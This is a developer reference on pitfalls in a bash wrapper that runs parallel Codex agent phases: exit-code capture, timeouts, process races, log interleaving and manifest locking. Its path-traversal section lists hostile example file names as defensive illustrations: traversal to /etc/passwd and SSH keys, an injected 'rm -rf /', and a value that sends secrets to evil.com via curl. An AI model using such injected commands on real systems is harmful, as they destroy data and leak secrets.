# Known Gotchas: codex_commands

## Overview

This document identifies critical security vulnerabilities, performance pitfalls, and common mistakes for implementing production-ready Codex commands with parallel Phase 2 execution. All gotchas include **detection methods** and **concrete solutions** with code examples.

**Categories Covered**:
- **Critical**: Exit code timing, security validation bypass, zombie processes (3 gotchas)
- **High**: Race conditions, timeout handling, profile omission (5 gotchas)
- **Medium**: Output interleaving, manifest corruption, approval blocking (3 gotchas)
- **Low**: Sequential anti-patterns, redundant naming (2 gotchas)

**Total Gotchas**: 13 documented with solutions

---

## Critical Gotchas

### 1. Exit Code Loss from Timing Race Condition

**Severity**: Critical
**Category**: Data Loss / Silent Failures
**Affects**: Bash parallel execution with `wait` command
**Source**: Stack Overflow (https://stackoverflow.com/questions/356100), codebase-patterns.md lines 996-1026

**What it is**:
When waiting for multiple background processes, bash only preserves the exit code of the most recent `wait` command. If you call `wait` multiple times without capturing the exit code immediately after each call, all but the last exit code are lost permanently. This creates silent failures where Phase 2 agents can fail without detection.

**Why it's a problem**:
- Phase 3 (gotcha detection) starts with incomplete/missing Phase 2 outputs
- No error logged in manifest for failed agents
- Final PRP has gaps but workflow reports success
- Debugging requires manual log inspection to discover silent failures

**How to detect it**:
- Search code for: `wait` commands without immediate `$?` capture
- Pattern match: `wait $PID1\nwait $PID2\n.*EXIT=$?` (gap between wait calls)
- Test: Inject failure in one Phase 2 agent, verify error is caught
- Symptom: Phase 2 reports success but outputs are missing

**How to avoid/fix**:
```bash
# ❌ WRONG - Only captures last exit code (Phase 2C)
timeout 600 codex exec --profile codex-prp --prompt "phase2a" > logs/2a.log 2>&1 &
PID_2A=$!

timeout 600 codex exec --profile codex-prp --prompt "phase2b" > logs/2b.log 2>&1 &
PID_2B=$!

timeout 600 codex exec --profile codex-prp --prompt "phase2c" > logs/2c.log 2>&1 &
PID_2C=$!

# WRONG: Multiple waits without intermediate capture
wait $PID_2A
wait $PID_2B
wait $PID_2C
EXIT_CODE=$?  # Only has exit code from PID_2C! 2A and 2B are lost.

if [ $EXIT_CODE -eq 0 ]; then
    echo "✅ All agents succeeded"  # FALSE - may have missed failures!
fi

# ✅ RIGHT - Capture exit code IMMEDIATELY after each wait
wait $PID_2A; EXIT_2A=$?  # Semicolon ensures immediate capture
wait $PID_2B; EXIT_2B=$?
wait $PID_2C; EXIT_2C=$?

# Now validate all exit codes
if [[ $EXIT_2A -eq 0 && $EXIT_2B -eq 0 && $EXIT_2C -eq 0 ]]; then
    echo "✅ All agents succeeded"
    log_phase_complete "$FEATURE" "phase2" 0 "$DURATION"
else
    echo "❌ Agent failures detected:"
    echo "  - Agent 2A (codebase): exit $EXIT_2A"
    echo "  - Agent 2B (docs):     exit $EXIT_2B"
    echo "  - Agent 2C (examples): exit $EXIT_2C"
    log_phase_complete "$FEATURE" "phase2" 1 "$DURATION"
    handle_partial_failure
fi

# Why this works:
# 1. Semicolon forces sequential execution (wait, THEN capture, THEN next line)
# 2. Each exit code stored in separate variable (no overwrite)
# 3. All exit codes available for validation logic
# 4. Failure detection is comprehensive (not just last process)
```

**Additional Resources**:
- Bash Manual - Job Control: https://www.gnu.org/software/bash/manual/html_node/Job-Control-Builtins.html
- Stack Overflow discussion: https://stackoverflow.com/questions/356100

**Testing**:
```bash
# Test that exit codes are captured correctly
test_exit_code_capture() {
    # Launch 3 processes: success, failure, success
    (exit 0) & PID1=$!
    (exit 1) & PID2=$!
    (exit 0) & PID3=$!

    # Capture each
    wait $PID1; EXIT1=$?
    wait $PID2; EXIT2=$?
    wait $PID3; EXIT3=$?

    # Verify middle failure was caught
    [[ $EXIT1 -eq 0 && $EXIT2 -eq 1 && $EXIT3 -eq 0 ]] || {
        echo "❌ Exit code capture failed"
        exit 1
    }
    echo "✅ Exit codes captured correctly"
}
```

---

### 2. Security Validation Bypass via Path Traversal

**Severity**: Critical
**Category**: Security / Command Injection
**Affects**: Feature name extraction from INITIAL.md file paths
**Source**: security-validation.md, OWASP (https://owasp.org/www-community/attacks/Path_Traversal)

**What it is**:
If feature name extraction doesn't validate for path traversal sequences (`..`, `/`, `\`), attackers can manipulate file paths to escape the `prps/` directory and overwrite arbitrary files. Combined with insufficient character validation, this enables command injection via shell metacharacters in feature names.

**Why it's a problem**:
- **Path traversal**: `prps/INITIAL_../../etc/passwd.md` → writes to `/etc/passwd`
- **Command injection**: `prps/INITIAL_test;rm -rf /.md` → executes `rm -rf /`
- **Directory escape**: `prps/INITIAL_../../../root/.ssh/authorized_keys.md` → compromise system
- **Data exfiltration**: `prps/INITIAL_test\`curl evil.com?data=\$(cat secret)\`.md` → leak secrets

**How to detect it**:
- Search code for: `basename`, `dirname`, path construction without validation
- Pattern match: Path operations before security checks
- Test: Pass `INITIAL_../../etc/test.md` and verify rejection
- Audit: Check if validation uses whitelist (good) or blacklist (bad)

**How to avoid/fix**:
```bash
# ❌ WRONG - No validation, vulnerable to traversal and injection
extract_feature_name_unsafe() {
    local filepath="$1"
    local basename=$(basename "$filepath" .md)
    local feature="${basename#INITIAL_}"  # Strip prefix
    echo "$feature"  # DANGER: Could be "../../etc/passwd" or "test;rm -rf /"
}

# Call with dangerous input
FEATURE=$(extract_feature_name_unsafe "prps/INITIAL_../../etc/passwd.md")
mkdir -p "prps/${FEATURE}/planning"  # Creates /etc/passwd/planning!

# ✅ RIGHT - 6-level security validation (defense in depth)
validate_feature_name() {
    local feature="$1"
    local validate_redundant="${2:-true}"

    # Level 1: Path traversal in feature name
    if [[ "$feature" == *".."* || "$feature" == *"/"* || "$feature" == *"\\"* ]]; then
        echo "❌ Path traversal detected in feature name: $feature" >&2
        echo "Feature names cannot contain: .. / \\" >&2
        return 1
    fi

    # Level 2: Whitelist check (only alphanumeric, underscore, hyphen)
    if [[ ! "$feature" =~ ^[a-zA-Z0-9_-]+$ ]]; then
        echo "❌ Invalid characters in feature name: $feature" >&2
        echo "Allowed: letters, numbers, underscore, hyphen" >&2
        return 1
    fi

    # Level 3: Length check (prevent buffer overflow, filesystem limits)
    if [ ${#feature} -gt 50 ]; then
        echo "❌ Feature name too long: ${#feature} chars (max 50)" >&2
        return 1
    fi

    # Level 4: Command injection characters (defense in depth)
    local dangerous='$`;&|><'
    local char
    for (( i=0; i<${#dangerous}; i++ )); do
        char="${dangerous:$i:1}"
        if [[ "$feature" == *"$char"* ]]; then
            echo "❌ Dangerous character detected: $char in $feature" >&2
            echo "Potential command injection risk" >&2
            return 1
        fi
    done

    # Level 5: Redundant prp_ prefix check
    if [[ "$validate_redundant" == "true" && "$feature" == prp_* ]]; then
        echo "❌ Redundant 'prp_' prefix detected: $feature" >&2
        echo "Files are in prps/ directory - prefix is redundant" >&2
        echo "Expected: ${feature#prp_}" >&2
        echo "See: .claude/conventions/prp-naming.md" >&2
        return 1
    fi

    # Level 6: Reserved names (prevent collision with system files)
    local reserved=("." ".." "CON" "PRN" "AUX" "NUL" "COM1" "LPT1")
    for name in "${reserved[@]}"; do
        if [[ "${feature^^}" == "$name" ]]; then
            echo "❌ Reserved name: $feature" >&2
            return 1
        fi
    done

    return 0
}

# Extract and validate feature name
extract_feature_name() {
    local filepath="$1"

    # Level 0: Path traversal in FULL PATH (before basename)
    if [[ "$filepath" == *".."* ]]; then
        echo "❌ Path traversal in filepath: $filepath" >&2
        return 1
    fi

    # Extract basename, remove extension
    local basename=$(basename "$filepath" .md)

    # Strip INITIAL_ prefix (using parameter expansion, not replace)
    # CRITICAL: ${var#prefix} only removes from START, not all occurrences
    local feature="${basename#INITIAL_}"

    # Validate extracted name
    if ! validate_feature_name "$feature" true; then
        return 1
    fi

    echo "$feature"
}

# Usage in wrapper script
INITIAL_MD="$1"
FEATURE_NAME=$(extract_feature_name "$INITIAL_MD") || {
    echo "❌ Feature name validation failed"
    exit 1
}

# Now safe to use in paths
mkdir -p "prps/${FEATURE_NAME}/planning"
```

**Why this validation works**:
1. **Whitelist approach**: Only allows known-safe characters (alphanumeric + `_` + `-`)
2. **Multiple layers**: Even if one check fails, others catch the attack
3. **Explicit errors**: Attacker gets clear message, can't probe for weaknesses
4. **No sanitization**: We reject, not sanitize (sanitization is error-prone)
5. **Fail-safe**: Returns non-zero on any validation failure, stops script

**Additional Resources**:
- OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal
- PortSwigger OS Command Injection: https://portswigger.net/web-security/os-command-injection
- Stack Overflow prevention: https://stackoverflow.com/questions/62576599

---

### 3. Zombie Processes from Missing Timeout Wrapper

**Severity**: Critical
**Category**: System Stability / Resource Exhaustion
**Affects**: All `codex exec` invocations, especially in parallel execution
**Source**: Feature-analysis.md lines 517-518, GNU timeout manual

**What it is**:
If a `codex exec` call hangs indefinitely (API timeout, network issue, infinite loop in agent), background processes never complete. The parent script waits forever on `wait`, blocking the entire PRP generation workflow. In parallel execution, one hung agent blocks all subsequent phases even if the other two completed successfully.

**Why it's a problem**:
- Workflow hangs indefinitely, no error message, no recovery
- Parent script cannot be interrupted (wait is blocking)
- Resource exhaustion: hung processes accumulate over time
- CI/CD pipelines timeout at higher level, obscuring root cause
- Manual intervention required (kill process tree from another terminal)

**How to detect it**:
- Search code for: `codex exec` without `timeout` wrapper
- Test: Create agent that sleeps 1000s, verify timeout kills it
- Monitor: Check for orphaned `codex` processes with `ps aux | grep codex`
- Symptom: Script hangs during Phase 2, no progress for >10 minutes

**How to avoid/fix**:
```bash
# ❌ WRONG - No timeout, can hang forever
codex exec --profile codex-prp --prompt "$(cat phase2a.txt)" > logs/2a.log 2>&1 &
PID_2A=$!
wait $PID_2A; EXIT_2A=$?  # May wait forever if agent hangs

# ✅ RIGHT - Timeout wrapper with graceful then forceful kill
TIMEOUT_SEC=600  # 10 minutes for research agents
KILL_AFTER=5     # Force kill 5 seconds after initial timeout

timeout --kill-after=${KILL_AFTER}s ${TIMEOUT_SEC}s \
    codex exec \
        --profile codex-prp \
        --prompt "$(cat phase2a.txt)" \
    > logs/2a.log 2>&1 &
PID_2A=$!

# Wait and capture exit code
wait $PID_2A; EXIT_2A=$?

# Interpret exit code (timeout uses specific codes)
if [ $EXIT_2A -eq 124 ]; then
    echo "❌ Agent 2A TIMEOUT (exceeded ${TIMEOUT_SEC}s)"
    echo "Check logs/2a.log for details"
    log_phase_complete "$FEATURE" "phase2a" 124 "$TIMEOUT_SEC"
    # Decide: retry, skip, or abort
    handle_timeout "phase2a"

elif [ $EXIT_2A -eq 137 ]; then
    echo "❌ Agent 2A KILLED (forceful termination after timeout)"
    echo "Process did not respond to TERM signal, had to use KILL"
    log_phase_complete "$FEATURE" "phase2a" 137 "$TIMEOUT_SEC"
    handle_killed_process "phase2a"

elif [ $EXIT_2A -eq 0 ]; then
    echo "✅ Agent 2A completed successfully"
    log_phase_complete "$FEATURE" "phase2a" 0 "$(($(date +%s) - START_TIME))"

else
    echo "❌ Agent 2A failed (exit: $EXIT_2A)"
    echo "Check logs/2a.log for error details"
    log_phase_complete "$FEATURE" "phase2a" "$EXIT_2A" "$(($(date +%s) - START_TIME))"
    handle_failure "phase2a" "$EXIT_2A"
fi

# Why this works:
# 1. timeout sends TERM signal after 600s (graceful shutdown)
# 2. If still running after 5s, timeout sends KILL signal (forceful)
# 3. Exit code 124 = timeout occurred (distinguishable from agent failure)
# 4. Exit code 137 = killed with SIGKILL (128 + 9)
# 5. Parent script never hangs indefinitely
```

**Timeout duration guidelines**:
- **Research agents (Phase 2)**: 600s (10 min) - heavy Archon search, codebase grep
- **Analysis (Phase 1)**: 300s (5 min) - single file read + analysis
- **Gotcha detection (Phase 3)**: 300s (5 min) - web search + document processing
- **Assembly (Phase 4)**: 180s (3 min) - template merge + validation

**Testing timeout behavior**:
```bash
# Test that timeout actually kills hung process
test_timeout_kills_hung_process() {
    echo "Testing timeout with hung process..."

    # Create script that hangs
    cat > /tmp/hung_agent.sh <<'EOF'
#!/bin/bash
echo "Starting hung agent..."
sleep 1000  # Simulate hang
EOF
    chmod +x /tmp/hung_agent.sh

    # Run with 5 second timeout
    START=$(date +%s)
    timeout --kill-after=2s 5s /tmp/hung_agent.sh
    EXIT=$?
    END=$(date +%s)
    DURATION=$((END - START))

    # Verify timeout occurred (exit 124) and duration is ~5s
    if [ $EXIT -eq 124 ] && [ $DURATION -ge 5 ] && [ $DURATION -le 7 ]; then
        echo "✅ Timeout correctly killed hung process in ${DURATION}s"
    else
        echo "❌ Timeout test failed: exit=$EXIT, duration=${DURATION}s"
        exit 1
    fi
}
```

**Additional Resources**:
- GNU timeout manual: https://man7.org/linux/man-pages/man1/timeout.1.html
- Exit codes: https://stackoverflow.com/questions/42615374
- Signal handling: https://www.gnu.org/software/coreutils/timeout

---

## High Priority Gotchas

### 4. Race Condition in Process Spawning

**Severity**: High
**Category**: Reliability / Silent Failures
**Affects**: Parallel execution with job tracking
**Source**: Web search (https://unix.stackexchange.com/questions/344360)

**What it is**:
A spawned background task can exit (and fail) before all tasks are spawned and the PID tracking list is complete. When using `jobs -p` to get all background jobs, if a job completes between spawn and enumeration, it's missing from the wait list entirely. This creates a silent failure where an agent fails but never gets waited on.

**Why it's a problem**:
- Fast-failing agent (e.g., invalid prompt, missing file) exits before `wait` loop
- Exit code never captured because PID not in tracking array
- Workflow reports success because it only waits on jobs that are still running
- Phase 3 starts with missing Phase 2 output, no error logged

**How to detect it**:
- Test with agent that fails immediately (e.g., `exit 1` in prompt)
- Check if failure is caught or if workflow reports success
- Count PIDs before and after spawn loop, verify they match
- Symptom: Occasional missing outputs with no error in manifest

**How to avoid/fix**:
```bash
# ❌ WRONG - Race condition if job exits before jobs -p
execute_phase "phase2a" &
execute_phase "phase2b" &
execute_phase "phase2c" &

# RACE: If phase2a fails fast, it exits before this line
for pid in $(jobs -p); do
    wait $pid; EXIT=$?
    # phase2a might not be in the list!
done

# ✅ RIGHT - Capture PIDs immediately, before any can exit
pids=()

execute_phase "phase2a" &
pids+=($!)  # Capture immediately

execute_phase "phase2b" &
pids+=($!)  # Capture immediately

execute_phase "phase2c" &
pids+=($!)  # Capture immediately

# Now safe to wait on all PIDs (captured before any could exit)
for pid in "${pids[@]}"; do
    # wait returns exit code even if process already exited
    wait $pid; exit_code=$?
    echo "Process $pid exited with code: $exit_code"
done

# Why this works:
# 1. $! is set immediately when & is executed
# 2. Array captures PID before process can exit
# 3. wait works even on already-exited processes
# 4. No dependency on jobs command timing
```

**Alternative pattern** (named PIDs for clarity):
```bash
# Even better: Named PIDs for each agent
execute_phase "phase2a" &
PID_2A=$!

execute_phase "phase2b" &
PID_2B=$!

execute_phase "phase2c" &
PID_2C=$!

# Wait on each named PID (clear which agent each code belongs to)
wait $PID_2A; EXIT_2A=$?
wait $PID_2B; EXIT_2B=$?
wait $PID_2C; EXIT_2C=$?

# Comprehensive error reporting
if [ $EXIT_2A -ne 0 ]; then
    echo "❌ Codebase researcher (2A) failed: exit $EXIT_2A"
fi
```

---

### 5. Timeout Exit Code Confusion (124 vs 125 vs 137)

**Severity**: High
**Category**: Error Handling / Incorrect Diagnosis
**Affects**: All timeout-wrapped commands
**Source**: GNU timeout manual, Stack Overflow (https://stackoverflow.com/questions/42615374)

**What it is**:
The `timeout` command uses specific exit codes to indicate different failure modes: 124 (timeout occurred), 125 (timeout command failed), 137 (SIGKILL), and others. If these are treated as generic failures, retry logic may incorrectly retry timeouts or fail to diagnose issues (e.g., timeout command not found).

**Why it's a problem**:
- Exit 124 (timeout) should not retry immediately (agent likely still too slow)
- Exit 125 (timeout failed) indicates system issue, not agent failure
- Exit 137 (SIGKILL) means process didn't respond to TERM, severe issue
- Generic error handling masks root cause, makes debugging harder
- Logging "agent failed" for timeout is misleading

**How to detect it**:
- Search code for: `timeout` without exit code handling
- Test: Create agent that times out, verify exit 124 is distinguished
- Check logs: Do they say "timeout" or generic "failed"?
- Symptom: Retry logic triggers on timeout (should have different behavior)

**How to avoid/fix**:
```bash
# ❌ WRONG - Treats all non-zero exits the same
timeout 600 codex exec --prompt "..." > log.txt 2>&1
EXIT=$?

if [ $EXIT -ne 0 ]; then
    echo "❌ Agent failed (exit $EXIT)"  # Loses timeout information
    retry_agent  # Wrong: shouldn't retry timeout same as other failures
fi

# ✅ RIGHT - Explicit handling for each timeout exit code
timeout --kill-after=5s 600s codex exec \
    --profile codex-prp \
    --prompt "$(cat prompt.md)" \
    > log.txt 2>&1
EXIT=$?

case $EXIT in
    0)
        echo "✅ Agent completed successfully"
        return 0
        ;;
    124)
        echo "❌ Agent TIMEOUT (exceeded 600s)"
        echo "This agent is too slow for the allotted time"
        echo "Options:"
        echo "  1. Increase timeout (current: 600s)"
        echo "  2. Simplify agent prompt"
        echo "  3. Skip this agent (continue with partial results)"

        # Don't retry timeout immediately - likely still too slow
        read -p "Increase timeout to 900s and retry? (y/n): " choice
        if [ "$choice" = "y" ]; then
            # Retry with longer timeout
            timeout --kill-after=5s 900s codex exec --profile codex-prp --prompt "$(cat prompt.md)" > log.txt 2>&1
            return $?
        else
            return 124  # Propagate timeout
        fi
        ;;
    125)
        echo "❌ TIMEOUT COMMAND FAILED"
        echo "The 'timeout' command itself failed (not the agent)"
        echo "Possible causes:"
        echo "  - timeout command not installed (install coreutils)"
        echo "  - Invalid timeout syntax"
        echo "  - Permission issue"

        # Check if timeout exists
        if ! command -v timeout &> /dev/null; then
            echo "ERROR: 'timeout' command not found"
            echo "Install: sudo apt-get install coreutils (Linux)"
            echo "         or brew install coreutils (macOS)"
        fi
        return 125
        ;;
    137)
        echo "❌ Agent KILLED (SIGKILL)"
        echo "Process did not respond to TERM signal, had to force kill"
        echo "This indicates a severe hang (not normal timeout)"
        echo "Investigate: Check if process is stuck in uninterruptible sleep"

        # Check logs for clues
        echo "Last 20 lines of log:"
        tail -20 log.txt

        return 137
        ;;
    *)
        echo "❌ Agent failed (exit $EXIT)"
        echo "Check log.txt for error details"

        # Show last few lines of log for quick diagnosis
        tail -10 log.txt

        # Generic failure - can retry
        return $EXIT
        ;;
esac

# Why this works:
# 1. Each exit code gets appropriate handling
# 2. User gets clear explanation of what happened
# 3. Retry logic differs based on failure type
# 4. Logs contain diagnostic information
```

**Exit code reference**:
- **0**: Command completed successfully before timeout
- **124**: Timeout occurred (TERM signal sent after duration)
- **125**: Timeout command itself failed (not the wrapped command)
- **126**: Command found but could not be invoked
- **127**: Command not found
- **137**: SIGKILL sent (128 + 9) - process didn't respond to TERM
- **Other**: Exit code of wrapped command (agent-specific failure)

---

### 6. Profile Omission in Codex Exec Calls

**Severity**: High
**Category**: Configuration / Wrong Model
**Affects**: All `codex exec` invocations
**Source**: Feature-analysis.md lines 536-538, codebase-patterns.md lines 1062-1081

**What it is**:
Calling `codex exec` without `--profile codex-prp` flag uses the default profile, which may have wrong model, wrong MCP servers, wrong approval policy, or wrong cost settings. In parallel execution, this is especially dangerous because different agents could use different configurations, causing inconsistent behavior.

**Why it's a problem**:
- Wrong model: Uses default (e.g., sonnet-3.5) instead of fast model (o4-mini)
- Wrong MCP: Archon MCP not available, agents can't search knowledge base
- Wrong approval: `on-request` blocks parallel execution, workflow hangs
- Cost explosion: Expensive model for all 3 Phase 2 agents
- Inconsistent results: Re-running workflow gets different results

**How to detect it**:
- Search code for: `codex exec` without `--profile`
- Test: Run without profile, check which model is used (check logs)
- Monitor: Compare cost between runs (should be consistent)
- Symptom: Workflow hangs waiting for approval in Phase 2

**How to avoid/fix**:
```bash
# ❌ WRONG - Uses default profile (unpredictable behavior)
codex exec --prompt "$(cat phase2a.txt)" > logs/2a.log 2>&1 &

# ✅ RIGHT - Always explicit profile
CODEX_PROFILE="${CODEX_PROFILE:-codex-prp}"  # Allow override via env var

timeout 600 codex exec \
    --profile "$CODEX_PROFILE" \
    --prompt "$(cat phase2a.txt)" \
    > logs/2a.log 2>&1 &

# Why this works:
# 1. Explicit profile ensures consistent configuration
# 2. Environment variable allows override for testing
# 3. All agents use same model/MCP/approval policy
# 4. Predictable cost and performance

# Validate profile exists before execution
validate_codex_profile() {
    local profile="$1"

    # Check if profile is configured
    if ! codex profile show "$profile" &> /dev/null; then
        echo "❌ Codex profile not found: $profile" >&2
        echo "" >&2
        echo "Available profiles:" >&2
        codex profile list >&2
        echo "" >&2
        echo "Create profile with:" >&2
        echo "  codex profile create $profile" >&2
        return 1
    fi

    # Verify profile has required settings
    local config=$(codex profile show "$profile")

    # Check model
    if ! echo "$config" | grep -q "model:"; then
        echo "⚠️  Warning: Profile $profile has no model specified" >&2
    fi

    # Check approval policy
    if echo "$config" | grep -q "approval_policy: on-request"; then
        echo "⚠️  Warning: Profile $profile uses on-request approval" >&2
        echo "This may block parallel execution. Consider on-failure for Phase 2." >&2
    fi

    return 0
}

# Usage in wrapper script
if ! validate_codex_profile "$CODEX_PROFILE"; then
    echo "❌ Profile validation failed"
    exit 1
fi
```

**Profile requirements for PRP generation**:
```yaml
# .codex/profiles/codex-prp.yaml
model: o4-mini  # Fast, cost-effective for research
mcp_servers:
  - archon  # Required for knowledge base search
approval_policy: on-failure  # Don't block on reads (Phase 2)
max_tokens: 8000
temperature: 0.3
```

---

### 7. Output Interleaving from Concurrent Writes

**Severity**: High
**Category**: Data Corruption / Debugging Difficulty
**Affects**: Parallel execution with shared stdout/stderr
**Source**: Codebase-patterns.md lines 1030-1058, feature-analysis.md line 379

**What it is**:
When multiple parallel processes write to stdout/stderr simultaneously, their output interleaves at unpredictable points, creating corrupted logs that are impossible to parse. If agents write to the same log file, lines can be interleaved mid-sentence or JSON can be corrupted.

**Why it's a problem**:
- Logs are unreadable: Lines from different agents mixed together
- JSON corruption: If agents output JSON, interleaving breaks parsing
- Debugging nightmare: Can't tell which agent produced which output
- Lost information: Partial lines overwritten by other agents
- No way to reconstruct original output order

**How to detect it**:
- Open log file, look for mixed output from different sources
- Try parsing as JSON, verify it fails
- Search code for: Multiple processes redirecting to same file
- Test: Run agents in parallel, check if logs are clean

**How to avoid/fix**:
```bash
# ❌ WRONG - All agents write to same stdout (interleaved mess)
codex exec --prompt "agent 2a" &
codex exec --prompt "agent 2b" &
codex exec --prompt "agent 2c" &
wait

# Output looks like:
# Agent 2AAgent 2B: Starting...
# : Starting codebase sAgent 2C: Starting...
# earch...
# Found 10 pAgent 2B: Found 5 docsatterns
# [Unusable garbage]

# ✅ RIGHT - Separate log file per agent
mkdir -p logs

timeout 600 codex exec \
    --profile codex-prp \
    --prompt "$(cat prompts/phase2a.txt)" \
    > logs/phase2a.log 2>&1 &  # Redirect both stdout and stderr
PID_2A=$!

timeout 600 codex exec \
    --profile codex-prp \
    --prompt "$(cat prompts/phase2b.txt)" \
    > logs/phase2b.log 2>&1 &
PID_2B=$!

timeout 600 codex exec \
    --profile codex-prp \
    --prompt "$(cat prompts/phase2c.txt)" \
    > logs/phase2c.log 2>&1 &
PID_2C=$!

# Wait for all
wait $PID_2A; EXIT_2A=$?
wait $PID_2B; EXIT_2B=$?
wait $PID_2C; EXIT_2C=$?

# Now logs are clean, can view individually or concatenate
echo "=== Agent 2A (Codebase Research) ==="
cat logs/phase2a.log
echo ""
echo "=== Agent 2B (Documentation Hunt) ==="
cat logs/phase2b.log
echo ""
echo "=== Agent 2C (Example Curation) ==="
cat logs/phase2c.log

# Why this works:
# 1. Each agent has dedicated file descriptor (no sharing)
# 2. OS handles file writes atomically (no corruption)
# 3. Logs are readable and parseable
# 4. Can debug each agent independently
# 5. Can still combine logs after completion (with clear separation)
```

**Log file naming convention**:
```
prps/{feature}/codex/logs/
├── manifest.jsonl          # Append-only audit trail
├── phase0.log              # Setup and initialization
├── phase1.log              # Feature analysis
├── phase2a.log             # Codebase researcher
├── phase2b.log             # Documentation hunter
├── phase2c.log             # Example curator
├── phase3.log              # Gotcha detection
└── phase4.log              # PRP assembly
```

---

### 8. Sequential Execution of Independent Tasks (Anti-Pattern)

**Severity**: High
**Category**: Performance / Wasted Time
**Affects**: Phase 2 execution if not parallelized
**Source**: Parallel-subagents.md, codebase-patterns.md lines 1149-1175

**What it is**:
Running Phase 2 agents (codebase researcher, doc hunter, example curator) sequentially instead of in parallel, despite no dependencies between them. This defeats the entire purpose of the parallel execution optimization and wastes 10+ minutes per PRP generation.

**Why it's a problem**:
- Sequential: 5min + 4min + 5min = 14 minutes total
- Parallel: max(5min, 4min, 5min) = 5 minutes total
- **Wastes 9 minutes** (64% slower than parallel)
- Defeats INITIAL.md requirement for "3x speedup"
- No excuse: agents are independent, no file conflicts

**How to detect it**:
- Check manifest timestamps: Phase 2 starts should be within 5 seconds
- Measure duration: If Phase 2 takes >10 minutes, likely sequential
- Search code for: Loop over agents without `&` backgrounding
- Test: Run workflow, verify all Phase 2 logs start simultaneously

**How to avoid/fix**:
```bash
# ❌ WRONG - Sequential execution (sum of times)
echo "Starting Phase 2 (sequential)..."
START=$(date +%s)

execute_phase "phase2a"  # 5 min
execute_phase "phase2b"  # 4 min
execute_phase "phase2c"  # 5 min

END=$(date +%s)
echo "Phase 2 duration: $((END - START))s"  # ~840s (14 min)

# ✅ RIGHT - Parallel execution (max of times)
echo "Starting Phase 2 (parallel)..."
START=$(date +%s)

# Launch all 3 agents in background
execute_phase "phase2a" &
PID_2A=$!

execute_phase "phase2b" &
PID_2B=$!

execute_phase "phase2c" &
PID_2C=$!

# Wait for all to complete
wait $PID_2A; EXIT_2A=$?
wait $PID_2B; EXIT_2B=$?
wait $PID_2C; EXIT_2C=$?

END=$(date +%s)
echo "Phase 2 duration: $((END - START))s"  # ~300s (5 min)

# Why this works:
# 1. All 3 agents start within milliseconds
# 2. Run simultaneously (true parallelism)
# 3. Total time = slowest agent (not sum)
# 4. 3x speedup achieved (14min → 5min)
```

**Verification test**:
```bash
# Prove parallel execution with concurrent timestamps
test_parallel_timing() {
    local manifest="prps/test_feature/codex/logs/manifest.jsonl"

    # Extract Phase 2 start timestamps
    local ts_2a=$(grep '"phase":"phase2a"' "$manifest" | grep '"status":"started"' | jq -r '.timestamp')
    local ts_2b=$(grep '"phase":"phase2b"' "$manifest" | grep '"status":"started"' | jq -r '.timestamp')
    local ts_2c=$(grep '"phase":"phase2c"' "$manifest" | grep '"status":"started"' | jq -r '.timestamp')

    # Convert to epoch seconds
    local epoch_2a=$(date -d "$ts_2a" +%s 2>/dev/null || date -j -f "%Y-%m-%dT%H:%M:%SZ" "$ts_2a" +%s)
    local epoch_2b=$(date -d "$ts_2b" +%s 2>/dev/null || date -j -f "%Y-%m-%dT%H:%M:%SZ" "$ts_2b" +%s)
    local epoch_2c=$(date -d "$ts_2c" +%s 2>/dev/null || date -j -f "%Y-%m-%dT%H:%M:%SZ" "$ts_2c" +%s)

    # Calculate max difference
    local max_diff=$(( $(printf '%s\n' $epoch_2a $epoch_2b $epoch_2c | sort -n | tail -1) - $(printf '%s\n' $epoch_2a $epoch_2b $epoch_2c | sort -n | head -1) ))

    # Verify parallel (all started within 5 seconds)
    if [ $max_diff -le 5 ]; then
        echo "✅ Parallel execution verified (max diff: ${max_diff}s)"
        return 0
    else
        echo "❌ Sequential execution detected (max diff: ${max_diff}s)"
        echo "Expected: all agents start within 5s"
        echo "Actual: ${max_diff}s between first and last"
        return 1
    fi
}
```

---

## Medium Priority Gotchas

### 9. JSONL Manifest Corruption from Concurrent Writes

**Severity**: Medium
**Category**: Data Corruption / Audit Trail Loss
**Affects**: Manifest logging during parallel execution
**Source**: Feature-analysis.md lines 520-524, web search (https://stackoverflow.com/questions/32902055)

**What it is**:
If multiple Phase 2 agents append to `manifest.jsonl` simultaneously using `>>`, writes can interleave mid-line, creating invalid JSON. This corrupts the audit trail and breaks manifest parsing with `jq`.

**Why it's a problem**:
- Corrupted JSON: `{"phase":"2a"...{"phase":"2b"...` (two objects on one line)
- Parsing failure: `jq` can't parse corrupted manifest
- Lost audit trail: Can't validate phase completion or generate reports
- Rare but severe: Happens occasionally, hard to reproduce in testing

**Why it's less critical than it sounds**:
- Phase 2 agents complete at different times (natural serialization)
- True simultaneous write requires agents to complete within milliseconds
- Small writes (<512 bytes) are typically atomic on POSIX systems
- JSONL format is somewhat resilient (one corrupted line doesn't break entire file)

**How to detect it**:
- Try parsing manifest: `jq empty manifest.jsonl` (fails if corrupted)
- Search for invalid JSON: Lines with multiple `{` at start
- Test: Force simultaneous writes from 3 processes, check for corruption
- Symptom: `jq` error or `grep` returns partial matches

**How to avoid/fix**:
```bash
# ❌ POTENTIALLY UNSAFE - Direct append from parallel processes
# (Usually works due to O_APPEND atomicity, but not guaranteed)
log_phase_start() {
    local feature="$1"
    local phase="$2"
    local manifest="prps/${feature}/codex/logs/manifest.jsonl"

    local entry='{"phase":"'${phase}'","status":"started","timestamp":"'$(date -u +"%Y-%m-%dT%H:%M:%SZ")'"}'
    echo "$entry" >> "$manifest"  # May interleave if exactly simultaneous
}

# ✅ OPTION 1: File locking with flock (most robust)
log_phase_start_locked() {
    local feature="$1"
    local phase="$2"
    local manifest="prps/${feature}/codex/logs/manifest.jsonl"
    local lockfile="prps/${feature}/codex/logs/.manifest.lock"

    local entry='{"phase":"'${phase}'","status":"started","timestamp":"'$(date -u +"%Y-%m-%dT%H:%M:%SZ")'"}'

    # Acquire exclusive lock, append, release lock (atomic)
    (
        flock -x 200  # Wait for exclusive lock on fd 200
        echo "$entry" >> "$manifest"
    ) 200>"$lockfile"

    # Why this works:
    # 1. flock guarantees exclusive access
    # 2. Only one process can write at a time
    # 3. Other processes wait (no interleaving)
    # 4. Lock released automatically on subshell exit
}

# ✅ OPTION 2: Temp file + atomic move (simpler, no flock dependency)
log_phase_start_atomic() {
    local feature="$1"
    local phase="$2"
    local manifest="prps/${feature}/codex/logs/manifest.jsonl"

    local entry='{"phase":"'${phase}'","status":"started","timestamp":"'$(date -u +"%Y-%m-%dT%H:%M:%SZ")'"}'

    # Write to temp file (unique per process)
    local temp_file="${manifest}.tmp.$$"
    echo "$entry" > "$temp_file"

